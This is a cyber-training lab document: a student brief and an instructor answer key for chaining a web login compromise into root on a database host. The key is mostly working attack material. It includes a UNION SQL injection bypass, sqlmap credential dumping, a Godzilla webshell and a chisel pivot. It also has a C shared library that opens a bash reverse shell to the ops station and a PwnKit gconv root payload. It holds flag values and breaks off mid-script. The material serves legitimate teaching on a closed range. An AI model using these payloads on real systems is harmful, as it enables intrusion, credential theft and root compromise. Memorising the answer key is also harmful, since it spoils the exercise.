# Student Brief: Web-to-SQL Group Exercise — Web Tier to Database Tier Compromise

## Activity Overview

This is a team-based lab chaining a web-application compromise into full compromise of a backend database host, including local privilege escalation to root. It draws directly on skills from earlier labs: SQL injection fundamentals, gaining access via file upload, and tunneling/pivoting into segments you cannot reach directly. This is the Block group activity. If the team finishes with time remaining, the instructor may offer an optional Hack The Box skills assessment.

## Operational Context

Your team has been given access to the external-facing network segment hosting a custom web application. Your objective is to determine whether that application's exposure can be leveraged into deeper network access — specifically, whatever backend infrastructure supports it — and to fully document that access chain for the engagement report.

You are not told in advance what is vulnerable, what credentials exist, or what lies behind the web tier. Discovering that is the point of the exercise.

**Flags:** Three proof markers sit along the chain: one on the web-tier host after you have code execution, one on the database-tier host as the service account that first gets a shell, and one on that same host after you reach root. Finding them is not the objective by itself — they mark progress along the access chain you are building and documenting.

## Starting Point

|Setting|Value|
|---|---|
|Starting position|PCTE live-action range; positioned as if coming from the internet|
|Known information|Website IP `200.200.200.1`|

At the start of this scenario, we only know the website IP: `200.200.200.1`. We are positioned as if we were coming from the internet.

Validate the IP is reachable:

```
nmap -sn 200.200.200.1
```

Backend addressing is discovered during the engagement, not given at start.

## Suggested Tools

- `nmap` for host discovery and service enumeration
- A browser or `curl`, plus an intercepting proxy (e.g., Burp Suite) for testing the login workflow
    
- A PHP-capable web shell / lightweight post-exploitation client (use one your team is already comfortable with)
    
- A TCP/SOCKS tunneling tool and `proxychains` (or equivalent) for reaching segments not directly routable from your position
    
- Standard Linux host-enumeration tools once you have a foothold on the database tier
    

Chisel and Godzilla are already staged on the ops station if you want to learn or play with them. They are optional — use a webshell or tunnel your team already knows if you prefer.

- Chisel: `/opt/chisel`
- Godzilla: `/opt/gozilla`

## Working Expectations

- Confirm `200.200.200.1` is reachable from the live-action range before starting.
- Track every credential, file, and command output you rely on as evidence.
- When a request fails, read the error message before trying something else — this lab rewards paying attention to what the application tells you.
    
- Avoid guessing your way through low- and medium-effort phases (e.g., authentication testing, service enumeration); each step should follow from evidence you already collected.
    
- If your team is stuck for an extended period, flag it to your instructor — guiding hints are available if your team is falling behind.
    

## Deliverables

- A summary of the full access chain, tier by tier.
- The key evidence supporting each transition (commands, output, discovered credentials/config, and how you found them).
    
- All three flags (web host, database host as the service account, database host as root), with the command/output used to retrieve each.
    
- Proof of final access level obtained on the database tier (e.g., `id`, `hostname`, `whoami` output).
    
- A short note on the most important lesson your team took from the chain — especially anywhere a defensive control (or its absence) mattered.
    

## Success Criteria

- Your team obtains an interactive shell on the database-tier host at the highest privilege level available.
    
- All three flags are captured and included in your submission.
    
- The full chain from initial web access to final privilege is documented and defensible — another operator could follow it from your notes.

## Tie-Back

- **Authentication bypass and web foothold:** Use the login path to get code execution on the web tier.
    
- **Pivot / tunnel:** Reach a segment your attacker position cannot route to directly.
    
- **General methodology:** Enumerate before acting, and treat local privilege escalation as its own investigation, not an assumed outcome.
    

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

---
# Web-to-SQL Group Exercise — Instructor Answer Key

## Objective and starting context

Live instructor path for SQL injection auth bypass → web shell → pivot → database-tier RCE → root. Students start on the ops station after entering the live-action range, with only the website IP `200.200.200.1`. Facilitation and progressive hints stay in B02.M16 instructor materials in Lesson Plans and Instructor Slides.zip and [`supporting-documents/L2.13 Web-to-SQL Instructor Hints.md`](https://moodle.cso.ops/mod/page/view.php?id=5691).

## Flag / reference table

|Flag|Value|Path|Context|
|---|---|---|---|
|Web-tier|`toad-house`|`C:\xampp\htdocs\includes\flag.txt`|After webshell, as `nt authority\local service`|
|SQL as mysql|`bowser-castle`|`/var/lib/mysql/flag.txt`|First reverse shell as `mysql`; file also contains **TOAD'S CHECKPOINT** (speak with instructor if a needed tool is missing)|
|SQL as root|`star-road`|`/root/flag.txt`|After PwnKit, as `root`|

Starting information: website IP `200.200.200.1`; ops station `200.200.200.2`; positioned as if coming from the internet.

## Initial situational awareness

Establish ops-station context after entering the live-action range. Then continue with the walkthrough discovery steps.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
ss -tulpen
ip -4 route
```

Expected findings: the operator is on the ops station (`200.200.200.2`) after entering the live-action range, not on either target; `200.200.200.1` should already be reachable without adding a route.

## Instructor live walkthrough

### Required Tools

- `nmap` (for host discovery and port scanning)
- A web browser or `curl`, plus **Burp Suite** (for intercepting and replaying the login request while testing injection payloads)
- `sqlmap` (optional — can automate/confirm the injection once a vulnerable parameter is identified)
- **Godzilla** webshell (PHP post-exploitation webshell/C2 client, used once file upload is reachable; staged at `/opt/gozilla`)
- **chisel** (TCP/SOCKS tunneling tool, used to pivot from the web tier into the internal database segment; staged at `/opt/chisel`)
- `proxychains` + a MySQL/MariaDB client (`mysql`), for reaching the database server through the tunnel
- `gcc` (for compiling the MariaDB `payload.so` on the ops box) and **Docker** with the pre-staged image tarball at `/opt/docker-gcc/pwnkit-gcc-12.04.tar.gz` (for the PwnKit shared library; this range has no internet, and the SQL host has no `gcc`)
- `python3` (for serving the PwnKit exploit and running its `ctypes`-based `execve()` trigger)
- `nc` (Netcat, for catching the reverse shell from the database tier)

### 1. Host Discovery

At the start of this scenario, we only know the website IP: `200.200.200.1`. We are positioned as if we were coming from the internet.

Validate the IP is reachable:

```
nmap -sn 200.200.200.1
```

_Output excerpt:_

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 11:21 -0400
Nmap scan report for 200.200.200.1
Host is up (0.00056s latency).
MAC Address: 00:0C:29:41:70:F5 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

**Observation:** The host is up and the MAC OUI resolves to a VMware virtual NIC.

**Inference:** This is a VM on the lab's virtualization host, not a container or physical box — expect a full Windows or Linux OS with normal services rather than a minimal Docker image. Proceed to a full port/service scan.

### 2. Service Enumeration

Scan the host for open TCP ports and service/version banners:

```
nmap -Pn -sV -p- 200.200.200.1
```

_Output excerpt:_

```
Nmap scan report for 200.200.200.1
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3)
```

**Observation:** Only web ports are exposed — **Apache 2.4.58 for Windows (Win64)**. The `(Win64)` banner is Apache's own platform tag and confirms this is an Apache build running on Windows, not Linux.

**Inference:** An Apache build shipped for Windows is almost always bundled through a stack installer such as **XAMPP** or **WAMP** rather than a hand-compiled binary. That matters later: if we get code execution, default XAMPP install paths (`C:\xampp\...`) are a reasonable first place to look for application source and configuration.

#### Initial Web Probing — A Login Page

Browse to the site and inspect what is presented. `-D -` prints response headers to stdout; `-o` writes the body to a file, so `head` on the pipe never shows HTML.

```
curl -s -D - http://200.200.200.1/ -o /tmp/wts-root.html | head -12
```

_Output excerpt:_

```
HTTP/1.1 302 Found
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
Location: login.php
Content-Length: 0
```

Follow `Location`. How we know `login.php`: that header.

```
curl -s -D - http://200.200.200.1/login.php -o /tmp/wts-root.html | head -12
```

_Output excerpt:_

```
HTTP/1.1 200 OK
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3
Content-Length: 927
Content-Type: text/html; charset=UTF-8
```

The body is in the `-o` file. `cat` it:

```
cat /tmp/wts-root.html
```

_Relevant lines:_

```
<title>Sign In | Taiwan Logistics Management Portal</title>
<form method="post" class="stack">
<label>Username<input name="username" autocomplete="username" required autofocus></label>
<label>Password<input type="password" name="password" autocomplete="current-password" required></label>
```

**Observation:** Custom portal (**Taiwan Logistics Management Portal**), not a known CMS. The form is `method="post"` with **no `action`**, so it POSTs to the current URL (`/login.php`). Field names are `username` and `password`.

**Inference:** Test the login POST to `[http://200.200.200.1/login.php](http://200.200.200.1/login.php)`. Open that request in Burp Suite's Proxy/Repeater so payloads can be replayed without re-typing the form.

#### Failed Attempt: Guessing Credentials

A natural first try is an obvious default combination:

```
Username: admin
Password: admin
```

_Output excerpt:_

```
invalid login
```

**Observation:** The app does not say the username is unknown. `admin` might actually exist; the password is wrong.

Contrast with a name that is probably not an account:

```
Username: test
Password: test
```

_Output excerpt:_

```
invalid user or password
```

_What we learned:_ The two messages are a username oracle. `admin` exists; `test` does not. Do not start a `UNION` payload with `admin` — that first `SELECT` would return the real admin row and PHP would never use the synthetic row. Probe the login SQL next.

### 3. Vulnerability Discovery

#### Confirming SQL Injection

Send a single quote in the username field to see whether it reaches a SQL query unescaped:

```
Username: admin'
Password: test
```

_Output excerpt:_

```
SQLSTATE[42000]: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'active'' at line 1
```

**Observation:** The backend leaks a raw `SQLSTATE[42000]` driver error, and the error message identifies the backend as **MariaDB**. The stray `active` token hints the real query has more logic after the username comparison (likely an `AND is_active = ...`-style clause).

**Inference:** The `username` field is concatenated directly into a SQL statement without parameterization — classic SQL injection. Comment out the rest of the query with `-- -` so the trailing clauses (like whatever produced `active`) don't interfere:

```
Username: admin' -- -
Password: test
```

_Output excerpt:_

```
Invalid password.
```

**Observation:** The syntax error is gone and we're back to a clean "Invalid password" — the comment successfully truncated the query, and the username-existence check for `admin` appears to have passed silently (no SQL error), meaning the login logic separately validates the password.

**Inference:** We can now inject arbitrary SQL into the username field as long as we terminate it with `-- -`. The next step is figuring out the query's shape (number of columns), which is required for any `UNION SELECT`-based bypass.

##### Alternate (sqlmap): confirm the injectable POST field

Same conclusion as the quote test, using sqlmap. First use: skim `sqlmap -hh` for `-u`, `--forms`, `-p`, `--dbms`, `--batch`, `--flush-session`, `--current-db`, `--tables`, `--dump`. Later sqlmap steps do not repeat that help output.

sqlmap may ask to use the server's `PHPSESSID` (`Do you want to use those [Y/n]`). Answer `Y`. `--batch` does not skip that prompt.

```
sqlmap -u "http://200.200.200.1/login.php" \
  --forms \
  -p username \
  --dbms=MySQL \
  --batch \
  --flush-session
```

How we know each option:

- `-u .../login.php` — `Location: login.php` on `/`, and the form has no `action`, so POST stays on this URL
- `--forms` — parse the login page at `-u` for POST fields. How we know a form is there: `cat` showed `method="post"` and `name="username"` / `name="password"`. sqlmap builds the same `application/x-www-form-urlencoded` body Burp would show (`name=value&name=value`). Dummy field values are sqlmap/`--batch` fills, same idea as the `admin`/`test` guess. Do not hand-build `--data`.
- `-p username` — the quote in **username** produced `SQLSTATE`
- `--dbms=MySQL` — that error named MariaDB (MySQL family); skips extra DBMS tests
- `--batch` — take sqlmap defaults so the demo does not stop on extra prompts (cookie still needs `Y`)
- `--flush-session` — first sqlmap run only, so this demo is not a leftover session. Omit it on later sqlmap commands.

_Relevant return:_

```
POST http://200.200.200.1/login.php
POST data: username=&password=
Parameter: username (POST)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
web server operating system: Windows
web application technology: Apache 2.4.58, PHP
```

**Observation:** `username` is injectable; backend is MariaDB on Windows Apache/PHP — the same conclusion as the quote test.

**Inference:** Continue enumerating with sqlmap, or stay on the manual `ORDER BY` path.

#### Determining the Column Count

Use `ORDER BY` with increasing column numbers. If the number exceeds the query's actual column count, the database raises an out-of-range error:

```
Username: admin' ORDER BY 1 -- -
Username: admin' ORDER BY 2 -- -
Username: admin' ORDER BY 3 -- -
Username: admin' ORDER BY 4 -- -
Username: admin' ORDER BY 5 -- -
```

_Output excerpt (ORDER BY 1 through 4):_

```
Invalid password.
```

_Output excerpt (ORDER BY 5):_

```
SQLSTATE[42S22]: Column not found: 1054 Unknown column '5' in 'order clause'
```

**Observation:** `ORDER BY 5` is the first value to error out.

**Inference:** The underlying `SELECT` returns exactly **4 columns**. Given the login form only submits a username and password, at least one of those 4 columns is the username and another is the password — the other two are unknown (likely an ID and a status/role flag, consistent with the earlier `active` hint).

##### Alternate (sqlmap): current database instead of UNION column count

Instead of counting UNION columns, ask which database the PHP connection is using. Connection flags (`-u`, `--forms`, `-p`, `--dbms`, `--batch`) are unchanged from the confirm step: `--forms` is still how sqlmap gets the POST body from the parsed login form. `--current-db` is the next enum after the parameter is known injectable. Do not use `--flush-session` here.

```
sqlmap -u "http://200.200.200.1/login.php" \
  --forms \
  -p username \
  --dbms=MySQL \
  --batch \
  --current-db
```

_Relevant return:_

```
current database: 'tw_mil_logistics'
```

A `command denied` warning means the web DB user is limited; enumeration can still continue.

**Observation:** The application is connected to `tw_mil_logistics`.

**Inference:** List tables in that database with sqlmap, or continue the manual UNION path.

#### Failed Attempt: Guessing Which Column Holds the Password

With 4 columns confirmed, a `UNION SELECT` can inject a fully attacker-controlled row. Do **not** start the username with `admin`. The login oracle already showed `admin` exists, so `admin' UNION SELECT ...` returns the real admin row first (`Password1!`) and PHP never uses the synthetic row. Starting with `'` makes `username = ''`; that `SELECT` is empty and only the UNION row is used. Start with distinguishable placeholder values so each column's role can be inferred from behavior:

```
Username: ' UNION SELECT 'col1', 'col2', 'col3', 'col4' -- -
```

We don't yet know which of the 4 returned columns the application compares against the submitted password, so test the password field against each placeholder in turn:

```
Password: col1
Password: col2
Password: col4
```

_Output excerpt (all three):_

```
Invalid password.
```

_What we learned:_ Only one of the four placeholder columns is actually compared as the password. Testing them one at a time (rather than guessing the query's internal field order) is the reliable way to find it without needing source access.

##### Alternate (sqlmap): list tables instead of probing col1–col4

List tables in the database from `--current-db` and pick the portal users table, instead of probing `col1`–`col4`. How we know `-D tw_mil_logistics`: that `--current-db` result. `--forms` is unchanged from the first sqlmap run (parsed login form, not a hand-built `--data` string).

```
sqlmap -u "http://200.200.200.1/login.php" \
  --forms \
  -p username \
  --dbms=MySQL \
  --batch \
  -D tw_mil_logistics \
  --tables
```

_Relevant return:_

```
Database: tw_mil_logistics
[10 tables]
+---------------------+
| dummy_table         |
| file_read           |
| logistics_inventory |
| military_bases      |
| my_scratch_read     |
| operational_units   |
| personnel           |
| supply_requests     |
| vehicle_assets      |
| web_portal_users    |
+---------------------+
```

**Observation:** Most tables look like logistics data. `web_portal_users` matches the login portal name.

**Inference:** Dump `web_portal_users` for credentials. Do not dump every table for this auth step.

#### Locating the Password Column and Bypassing Login

Continue the same one-at-a-time test:

```
Username: ' UNION SELECT 'col1', 'col2', 'col3', 'col4' -- -
Password: col3
```

_Output excerpt:_

```
Login successful. Welcome, admin.
```

**Observation:** Password `col3` succeeds because the first `SELECT` returned no row (`username = ''`) and PHP used the synthetic UNION row. The display name is whichever injected column the application treats as the username. Setting that column to the literal `'admin'` is what produces the `Welcome, admin` session, independent of any real account.

**Inference:** This is a full authentication bypass via UNION-based SQL injection: we never needed a real username or password. The final working request is:

```
Username: ' UNION SELECT 'col1', 'col2', 'col3', 'admin' -- -
Password: col3
```

This logs a session in as `admin` using a synthetic row, and confirms the query is exploitable with `UNION SELECT` for further data extraction if needed later. With an authenticated admin session, look for additional attack surface in the application — specifically, a file upload feature reachable from the now-authenticated admin area.

##### Alternate (sqlmap): dump users and log in with a real admin row

Dump `web_portal_users` and log in with a recovered row. How we know `-T web_portal_users`: the table chosen from `--tables`. `--forms` is still the POST body source from the parsed login form. sqlmap does not set `PHPSESSID`; the browser (or a POST that keeps the cookie) does.

```
sqlmap -u "http://200.200.200.1/login.php" \
  --forms \
  -p username \
  --dbms=MySQL \
  --batch \
  -D tw_mil_logistics \
  -T web_portal_users \
  --dump
```

_Relevant return_ (admin row; other accounts also use `Password1!`):

```
| username | password   | role          | is_admin | account_status |
| admin    | Password1! | administrator | 1        | active         |
```

**Observation:** `admin` / `Password1!`, `is_admin=1`, `account_status=active`. That matches the failed guess (`admin` / `admin` → invalid login): the username was right, the password was not. Passwords are plaintext, not hashes.

**Inference:** Log in at `[http://200.200.200.1/login.php](http://200.200.200.1/login.php)` with `admin` / `Password1!` to get the admin session, then continue at section 4 (file upload). If this dump showed hashes instead, fall back to the manual UNION path.

### 4. Exploit Preparation & Remote Access — Web Shell Upload

The authenticated admin area exposes a file upload page. Rather than a one-line PHP web shell, use **Godzilla** — a widely used post-exploitation webshell/C2 framework. Godzilla's client generates a small PHP (or JSP/ASPX) agent stub with a chosen key and encoder (base64/XOR/AES variants), so each generated payload has a different static signature; the paired desktop client then talks to that agent over ordinary HTTP POST requests to provide a file manager, command execution, and pivoting features.

Generate a PHP payload from the Godzilla client, then upload it through the admin file-upload form and note the path it was saved under (e.g. `uploads/`).

**Observation:** In this lab environment, the target's Windows Defender real-time protection is disabled, so the unmodified Godzilla PHP agent uploads and executes without needing an additional AV-evasion pass. (On a hardened target you would need a more heavily obfuscated encoder — treat that as a lab-environment convenience, not something to assume in general.)

Connect to the uploaded agent with the Godzilla client using the matching key/encoder, and confirm code execution:

```
Godzilla > <uploaded-agent-URL>
Godzilla > whoami
```

_Output excerpt:_

```
nt authority\local service
```

**Observation:** The PHP/XAMPP worker is `nt authority\local service`, not SYSTEM. That account can still read app files (`db_config.php`) and run the chisel client. Web-tier local privilege escalation is **not** an intended path; stay on this session and continue host enumeration.

Confirm host identity and addressing from the foothold. `ipconfig` prints Windows interface configuration; use it here to compare the host's bound address against the public IP scanned from the internet position:

```
Godzilla > ipconfig
```

_Output excerpt:_

```
Ethernet adapter Ethernet0:

   IPv4 Address. . . . . . . . . . . : 172.16.1.3
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.1.1
```

**Observation:** The web host's local IPv4 is `172.16.1.3`, which is not the address we scanned (`200.200.200.1`).

**Inference:** `200.200.200.1` is the DMZ/edge NAT mapping; the web server sits on an internal RFC1918 interface. That internal address is learned only after code execution on the target — it is not starting information. Continue enumerating this host for application source and credentials.

### 5. Post-Exploitation & Credential Discovery on the Web Tier

Given the Apache `(Win64)` banner from Section 2, check the standard XAMPP layout for the application source and its database configuration. List `includes` first — that directory is the usual place for PHP config includes, and it is also where the web-tier flag lives:

```
Godzilla > dir C:\xampp\htdocs\includes
```

_Output excerpt:_

```
db_config.php
flag.txt
```

**How students know this value:** Section 2 already pointed at default XAMPP paths (`C:\xampp\...`). After code execution, listing the application include directory is ordinary web-foothold enumeration, not a jump to a named flag path.

Read the flag while you are already in that folder:

```
Godzilla > type C:\xampp\htdocs\includes\flag.txt
```

_Output:_

```
toad-house
```

**Observation:** `flag.txt` in the same folder as `db_config.php` is the web-tier proof of access (`toad-house`). Continue with the config file for credentials and the next hop.

```
Godzilla > type C:\xampp\htdocs\includes\db_config.php
```

_Output (key lines):_

```
$db_host = "172.16.2.3";
$db_user = "svc_webapp";
$db_pass = "Password1!";
// TEMP - dev testing only, remove before prod!
$db_root_user = "root";
$db_root_pass = "SQLwebtest1!";
```

**Observation:** The config file discloses the database host IP, an application service account (`svc_webapp`), and — left behind by a developer for local testing, per the comment — a **root** MySQL/MariaDB credential.

**Inference:** We now have a target IP for the database tier (`172.16.2.3`) and two sets of credentials to try against it. Before connecting directly, confirm whether the database host is reachable from our attacker position.

### 6. Pivoting to the Database Tier

```
nmap -sn 172.16.2.3
```

_Output excerpt:_

```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

**Observation:** The database host is not directly reachable from the attacker box — it sits on an internal-only segment that only the compromised web server can route to.

**Inference:** Pivot through the web server. Use **chisel**, a lightweight TCP/SOCKS tunneling tool distributed as a single static binary, to build a reverse SOCKS proxy: the chisel _server_ runs on the attacker box and listens for an inbound connection; the chisel _client_ runs on the compromised web server and dials back out to the attacker, then exposes a SOCKS5 proxy that routes into whatever networks the web server itself can reach.

On the attacker box, start the chisel server in reverse mode:

```
./chisel server -p 5060 --reverse
```

Upload `chisel.exe` to the web server through the Godzilla file manager, then run the client from the web shell so it connects back to the ops station (`200.200.200.2`):

```
Godzilla > powershell -c "Start-Process -NoNewWindow -FilePath 'C:\xampp\htdocs\uploads\chisel.exe' -ArgumentList 'client --max-retry-count 5 200.200.200.2:5060 R:socks'"
```

_Attacker-side chisel server output:_

```
session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**Observation:** The client connected and chisel is now listening locally on `127.0.0.1:1080`, forwarding SOCKS5 traffic through the web server.

Point `proxychains` at that local SOCKS listener (`socks5 127.0.0.1 1080` in `/etc/proxychains.conf` or `/etc/proxychains4.conf`) so any proxychains-wrapped command is routed through the tunnel.

#### Failed Attempt: Connecting With Default TLS Negotiation

A first connection attempt with a stock `mysql` client fails:

```
proxychains mysql -h 172.16.2.3 -u svc_webapp -p
```

_Output excerpt:_

```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the SSL library is not enabled
```

_What we learned:_ The `mysql` client tries to negotiate TLS by default, and the tunneled path (or the server's SSL setup) doesn't cleanly support that negotiation here. Since this is an internal pivot rather than a path crossing the open lab network, drop the TLS requirement explicitly and retry.

#### Reaching the Database Server

```
proxychains mysql --skip-ssl -h 172.16.2.3 -u svc_webapp -p
```

```
Password: Password1!
```

_Output excerpt:_

```
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

**Observation:** The service account connects successfully through the tunnel.

### 7. Database Tier Enumeration & the Path to a Shell

Enumerate what this account can see:

```
SHOW DATABASES;
SELECT CURRENT_USER();
SHOW GRANTS;
```

**Observation:** `svc_webapp` has typical application-level grants (`SELECT`/`INSERT`/`UPDATE` on the application schema) — nothing that looks like `SUPER` or file/administrative privileges.

**Inference:** Getting a shell from inside MySQL/MariaDB (via UDFs, `INTO DUMPFILE` tricks, or provider callbacks) generally requires elevated privileges such as `SUPER` or `FILE`. Confirm that assumption before spending time building a payload:

#### Failed Attempt: Breaking Out With the Low-Privilege Account

```
SET GLOBAL wsrep_provider='/tmp/malicious.so';
```

_Output excerpt:_

```
ERROR 1227 (42000): Access denied; you need (at least one of) the SUPER privilege(s) for this operation
```

_What we learned:_ `svc_webapp` cannot set global provider variables. This confirms the low-level account "can not break out of the mysql unless sql is EXTREAMLY misconfigured" — we need the higher-privileged account. Reconnect using the **root** credential recovered from `db_config.php` in Section 5.

```
proxychains mysql --skip-ssl -h 172.16.2.3 -u root -p
```

```
Password: SQLwebtest1!
```

_Output excerpt:_

```
Welcome to the MariaDB monitor.
MariaDB [(none)]> SELECT CURRENT_USER();
+----------------+
| root@%         |
+----------------+
```

**Observation:** The leftover root credential the developer forgot to remove authenticates with full privileges, including `SUPER`.

**Inference:** With `SUPER`, the `wsrep_provider` variable becomes a usable code-execution primitive: MariaDB/Galera Cluster exposes `wsrep_provider` as a global variable pointing at a loadable shared library implementing the Galera replication provider API. Setting it makes the server `dlopen()` whatever path is configured — if we can get an attacker-controlled `.so` onto the filesystem and point `wsrep_provider` at it, its load-time constructor runs as the MariaDB service account.

### 8. Breaking Out of MariaDB to a Reverse Shell

#### Build the Payload

On the attacker box, write a small shared library whose constructor spawns a reverse shell in a forked child (so MariaDB's own process doesn't hang waiting on it):

```
// payload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void __attribute__((constructor)) initialize() {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: reverse shell; parent returns immediately so
        // dlopen() inside MariaDB does not block on us.
        system("bash -c 'bash -i >& /dev/tcp/200.200.200.2/4444 0>&1'");
        exit(0);
    }
}
```

The `__attribute__((constructor))` marks `initialize()` to run automatically as soon as the shared object is loaded — no exported function needs to be called by MariaDB for the code to execute.

```
gcc -Wall -fPIC -shared -o payload.so payload.c
```

Start a listener before triggering the payload:

```
nc -lvnp 4444
```

#### Deliver the Payload Through SQL

Rather than fighting binary-safe file transfer through the SQL client (raw shared-object bytes tend to corrupt over copy/paste), hex-encode the compiled library and have MariaDB write it back out to disk with `INTO DUMPFILE`:

```
proxychains mysql --skip-ssl -h 172.16.2.3 -u root -p'SQLwebtest1!' \
  -e "SELECT 0x$(xxd -p /home/kali/dragon/payload.so | tr -d '\n') INTO DUMPFILE '/tmp/malicious.so';"
```

**Observation:** `xxd -p ... | tr -d '\n'` produces one continuous hex string of the compiled library; prefixing it with `0x` lets MariaDB interpret it as a binary literal, and `INTO DUMPFILE` writes the raw bytes to `/tmp/malicious.so` on the _server_.

#### Trigger the Load

Reconnect and set the provider variable to the path we just wrote:

```
proxychains mysql --skip-ssl -h 172.16.2.3 -u root -p'SQLwebtest1!'
```

```
SET GLOBAL wsrep_provider='/tmp/malicious.so';
```

_Listener output:_

```
listening on [any] 4444 ...
connect to [200.200.200.2] from (UNKNOWN) [172.16.2.3] 41822
bash-4.4$
```

**Observation:** The provider load executed our constructor and we caught a shell back on the attacker listener.

Confirm the execution context:

```
bash> whoami
mysql

bash> pwd
/var/lib/mysql

bash> python3 --version
Python 3.6.8

bash> which pkexec
/usr/bin/pkexec
```

**Observation:** The shell runs as the `mysql` service account (not root). The working directory is the MariaDB datadir (`/var/lib/mysql`), which is this account's usual home on the host. The host has both `python3` and `pkexec` present. There is no `gcc` on this SQL host.

List the datadir before filtering — that directory is where operators already are, and it is also where the mysql-user flag lives:

```
bash> ls /var/lib/mysql
```

_Output excerpt (relevant line):_

```
flag.txt
```

**How students know this value:** After `whoami` returns `mysql` and `pwd` shows `/var/lib/mysql`, listing the current directory is ordinary service-account enumeration. The MariaDB datadir is the native place this user can write and read files; it is not a training-only path.

```
bash> cat /var/lib/mysql/flag.txt
```

_Output:_

```
bowser-castle

=== TOAD'S CHECKPOINT ===

The road ahead may require supplies that aren't available
in this kingdom.

If you've identified your next step but can't continue because
something you need isn't available, speak with your instructor.
```

**Observation:** `bowser-castle` is proof of access as `mysql`. The checkpoint text is the intended stall cue: if the next step needs a compiler or package that is missing on this host, ask the instructor rather than `apt-get` or compile here.

**Inference:** `pkexec` and `python3` being present together is exactly the precondition for **CVE-2021-4034 ("PwnKit")** — a well-known local privilege escalation in `pkexec`'s argument/environment handling. Check for other SUID escalation paths before committing to a specific technique.

**Instructor note:** When a team recovers this file and then stalls on compiling a payload, walk load and compile-in-container from the hint sheet (`docker load -i /opt/docker-gcc/pwnkit-gcc-12.04.tar.gz`, then `docker run ... gcc`). Send them back to write their own source and finish the LPE. Do not hand PwnKit C, the Python driver, or delivery steps.

Upgrade the raw reverse shell to a full interactive TTY before doing further work (job control and line editing are broken on the bare `/dev/tcp` shell):

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 9. Privilege Escalation — PwnKit (CVE-2021-4034)

Survey SUID binaries broadly before committing to `pkexec` specifically:

```
find / -perm -4000 -type f 2>/dev/null
```

_Output excerpt (relevant line):_

```
/usr/bin/pkexec
```

**Observation:** `pkexec` is present and SUID-root, matching what `which pkexec` already showed, and no more obviously-misconfigured SUID binary stands out in the fuller listing.

**Inference:** `pkexec` (part of PolicyKit) has a documented memory-corruption/argument-handling flaw when invoked with an empty `argv[0]`, allowing an unprivileged local user to reach a root shell (CVE-2021-4034). Public write-ups on `CVE-2021-4034 pkexec` describe exploits that abuse `pkexec`'s environment sanitization together with a crafted `GCONV_PATH` (glibc's character-conversion module search path) to get `pkexec` to load an attacker-controlled shared object as root.

#### Build the PwnKit Payload (on the ops box)

The malicious `gconv` module must be compiled against a glibc ABI compatible with the target. Building it directly on a modern Kali can produce a library the target's older glibc can't load. This range has no internet (no Docker Hub pull, no `apt-get`), and the SQL host has no `gcc`, so do not compile there. After the instructor hint that a compile tool is already on the Kali box, look under `/opt`:

```
ls /opt/docker-gcc
```

_Output excerpt:_

```
pwnkit-gcc-12.04.tar.gz
```

Load the pre-staged image. `docker load -i` accepts a gzipped tarball:

```
docker load -i /opt/docker-gcc/pwnkit-gcc-12.04.tar.gz
```

Write the payload source on the ops box:

```
// pwnkit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; exec /bin/sh");
    exit(0);
}
```

Compile inside the loaded image (old glibc). No pull and no `apt-get`:

```
docker run --rm -v "$PWD":/tmp -w /tmp pwnkit-gcc:12.04 \
  gcc -shared -o pwnkit.so pwnkit.c -fPIC
```

**Observation:** `pwnkit-gcc:12.04` is already on the ops station at `/opt/docker-gcc/pwnkit-gcc-12.04.tar.gz`. The image includes `gcc`, so this command does not need the network. The resulting `.so` still loads on the Ubuntu 20.04 database host.

Base64-encode the compiled library so it can be embedded as a plain string inside a Python script:

```
base64 -w 0 pwnkit.so
```

#### Build the Exploit Driver

`pkexec`'s vulnerable path is triggered through a specific, minimal `execve()` call — an empty `argv` and a crafted environment naming a fake `gconv` module directory via `GCONV_PATH`/`CHARSET`. Calling `execve()` directly through Python's `ctypes` (rather than via a shell) gives exact control over `argv`/`envp`, including passing an empty argument list that a shell wrapper could not represent cleanly:

```
#!/usr/bin/env python
import os
import sys
import tempfile
import base64
import shutil
import ctypes

# PASTE THE base64 OUTPUT FROM `base64 -w 0 pwnkit.so` HERE, KEEP THE QUOTES:
SO_BASE64 = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAA..."

def main():
    tmpdir = tempfile.mkdtemp()
